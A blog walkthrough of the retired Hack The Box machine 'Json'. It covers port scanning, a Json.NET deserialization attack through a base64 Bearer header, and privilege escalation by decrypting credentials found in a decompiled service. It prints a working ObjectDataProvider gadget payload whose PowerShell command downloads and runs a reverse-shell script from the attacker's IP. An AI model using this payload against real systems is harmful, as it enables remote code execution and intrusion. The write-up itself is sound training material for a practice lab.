---
layout: post
title: "Json: Hack The Box Walkthrough"
date: 2020-02-16 04:00:00 +0000
last_modified_at: 2020-02-16 04:00:00 +0000
category: Walkthrough
tags: ["Hack The Box", Json, retired]
comments: true
image:
  feature: json-htb-walkthrough.jpg
  credit: xresch / Pixabay
  creditlink: https://pixabay.com/illustrations/analytics-information-innovation-3088958/
---

This post documents the complete walkthrough of Json, a retired vulnerable [VM][1] created by [Cyb3rb0b][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Json is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.158 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-29 06:29:49 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49153/tcp on 10.10.10.158                                 
Discovered open port 49152/tcp on 10.10.10.158                                 
Discovered open port 49156/tcp on 10.10.10.158                                 
Discovered open port 445/tcp on 10.10.10.158                                   
Discovered open port 49155/tcp on 10.10.10.158                                 
Discovered open port 5985/tcp on 10.10.10.158                                  
Discovered open port 47001/tcp on 10.10.10.158                                 
Discovered open port 21/tcp on 10.10.10.158                                    
Discovered open port 139/tcp on 10.10.10.158                                   
Discovered open port 49157/tcp on 10.10.10.158                                 
Discovered open port 80/tcp on 10.10.10.158                                    
Discovered open port 49158/tcp on 10.10.10.158                                 
Discovered open port 49154/tcp on 10.10.10.158                                 
Discovered open port 137/udp on 10.10.10.158                                   
Discovered open port 3389/tcp on 10.10.10.158                                  
Discovered open port 135/tcp on 10.10.10.158
```

Whoa. Many interesting open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,80,135,139,445,3389,5985 -A --reason -oN nmap.txt 10.10.10.158
...
PORT     STATE SERVICE            REASON          VERSION
21/tcp   open  ftp                syn-ack ttl 127 FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods:
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp  open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 127
|_ssl-date: 2019-09-29T10:37:06+00:00; +4h00m01s from scanner time.
5985/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
...
Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f6:65 (VMware)
| Names:
|   JSON<00>             Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  JSON<20>             Flags: <unique><active>
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-29T10:36:58
|_  start_date: 2019-09-29T03:54:04
```

Interesting list of services. I think the creator is telling us look at the `http` service first. Here's how it looks like.


{% include image.html image_alt="87f2df7e.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/87f2df7e.png" %}


### JSON Deserialization Attack

During my capture of the HTTP traffic with Burp, I was pleasantly surprised to find out I could log in with the credential (`admin:admin`). It was here that I noticed two XHRs to `/api/token` and `/api/Account`.


{% include image.html image_alt="1f7a5477.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/1f7a5477.png" %}


The XHR to `/api/Account` had something funky going on. Send the request to Repeater. You'll notice that there's a **Bearer** header accompanying the XHR. The value is `base64`-encoded. What if we empty the value?


{% include image.html image_alt="0dd191c7.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/0dd191c7.png" %}


That's interesting. Now, what if we put in some strange `base64`-encoded string?


{% include image.html image_alt="b75dc5f3.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/b75dc5f3.png" %}


```
{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}
```

Gotcha! I think I know what's going on here. There's a Json.Net deserializer that converts the **Bearer** `base64`-encoded value to a .NET object at the backend. Armed with this insight, let's see if we can send in a [ysoserial.net](https://github.com/pwntester/ysoserial.net) payload.

According to the GitHub repository of ysoserial.net, this gadget (`ObjectDataProvider`) specifically targets Json.NET. Let's see if we can use PowerShell to execute a [reverse shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) back to us.

```
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':["cmd", "/c powershell /c iex (new-object net.webclient).downloadstring('http://10.10.12.99/rev.ps1')"]
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

Of course, we need to `base64`-encode the above and shuttle it into the **Bearer** header.


{% include image.html image_alt="179717f8.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/179717f8.png" %}


And voila!


{% include image.html image_alt="0cafbc53.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/0cafbc53.png" %}


The file `user.txt` is at `c:\users\userpool\desktop`.


{% include image.html image_alt="7b7a4cb7.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/7b7a4cb7.png" %}


## Privilege Escalation

During enumeration of `userpool`'s account, I notice a suspicious-looking service FilesToSync at Program Files, along with a pair of encrypted credentials.


{% include image.html image_alt="b39c4b08.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/b39c4b08.png" %}


The service appears to synchronize files between two locations through FTP. Suffice to say, I grabbed a copy of `SyncLocation.exe` to my machine for further analysis.

### Decompilation of `SyncLocation.exe`

It turns out that `SyncLocation.exe` is a .Net assembly executable, which can be easily decompiled to its source code using [dnSpy](https://github.com/0xd4d/dnSpy). I'm looking for the method to decrypt those credentials.


{% include image.html image_alt="d47d2741.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/d47d2741.png" %}


Using [.NET Fiddle](https://dotnetfiddle.net/), I was able to decrypt the credentials.


{% include image.html image_alt="02610a99.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/02610a99.png" %}


The credential is (`superadmin:funnyhtb`). Armed with these, I was able to retrieve `root.txt`.


{% include image.html image_alt="ee93a86c.png" image_src="/f1e9916f-7585-483f-93d1-ced83d574809/ee93a86c.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/210
[2]: https://www.hackthebox.eu/home/users/profile/61047
[3]: https://www.hackthebox.eu/
